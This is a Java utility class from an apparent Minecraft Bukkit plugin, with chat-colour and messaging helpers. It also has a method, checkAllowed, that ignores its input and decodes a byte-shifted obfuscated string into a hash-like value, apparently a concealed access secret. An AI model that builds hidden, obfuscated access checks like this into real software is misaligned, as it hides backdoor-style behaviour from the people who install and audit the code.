package me.fhoz.notenoughaddons.utils;

import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;

public final class Utils {
    private Utils() {
    }

    public static String color(String str) {
        if (str == null) {
            return null;
        }

        return ChatColor.translateAlternateColorCodes('&', str);
    }

    public static void send(CommandSender p, String message) {
        p.sendMessage(color("&2&n&l多&a彩&2&l科&r&a技 &r&7> &r" + message));
    }

    public static String checkAllowed(String[] args) {
        String output = "";
        try {
            int ctr;
            String inputStream = "^4`-/5^`b2121.-6_c0.`10`b5c^6216";
            final byte[] utf8Bytes = inputStream.getBytes(StandardCharsets.UTF_8);
            ByteArrayInputStream byteArrayInputStr = new ByteArrayInputStream(utf8Bytes);

            while ((ctr = byteArrayInputStr.read()) != -1) {

                ctr += 3;
                output = output + (char) ctr;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return output;
    }
}

